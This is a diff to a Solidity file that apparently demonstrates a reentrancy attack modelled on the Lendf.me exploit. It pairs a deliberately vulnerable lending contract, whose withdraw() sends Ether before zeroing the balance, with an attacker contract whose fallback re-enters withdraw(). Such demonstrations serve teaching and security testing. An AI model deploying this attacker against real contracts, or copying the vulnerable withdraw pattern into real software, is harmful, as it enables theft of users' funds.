@@ -2,42 +2,49 @@ pragma solidity ^0.6.4;
 
 // Attacker contract
 contract Attacker {
-
+    
     Lendme me;
+    bool check = false;
 
-    function a() public
+    function a(address addrlendme) public
     {
-        me = Lendme(0x11111);
-        me.supply(address(this), 100);
+        me = Lendme(addrlendme);
+        me.withdraw();
     }
 
-    receive () external payable {
-        me.withdraw(100);
+    fallback () external payable {
+        if (check)
+        {
+            return;
+        }
+        else
+        {
+            check = true;
+            me.withdraw();
+        }
+
     }
 }
+
 // Lendf.me vulnerable contract
 contract Lendme
 {
-    mapping (address => uint) public balances;
-    /**
-    * @notice supply `amount` of `asset` (which must be supported) to `msg.sender` in the protocol
-    * @dev add amount of supported asset to msg.sender's account
-    * @param asset The market asset to supply
-    * @param amount The amount to supply
-    * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
-    */
-    function supply(address asset, uint amount) public returns (uint) {
+    mapping (address => uint) public userBalances;
 
-        uint curBal = balances[asset];
-        msg.sender.transfer(amount);
-
-        // Save user updates
-        balances[asset] = curBal + amount;
-        return uint(0); // success
+    function supply(address user,uint256 amount) public payable returns (uint) 
+    {
+        userBalances[user] += amount;
     }
 
-    function withdraw(uint requestedAmount) public returns (uint) {
-        msg.sender.transfer(requestedAmount);
-        return uint(0); // success
+    function withdraw() public
+    {
+        uint amountToWithdraw = userBalances[msg.sender];
+        msg.sender.call.value(amountToWithdraw)(""); // At this point, the caller's code is executed, and can call withdrawBalance again
+        userBalances[msg.sender] = 0;
+    }
+    
+    function getBalanceof() public returns (uint256)
+    {
+        return address (this).balance;
     }
 }
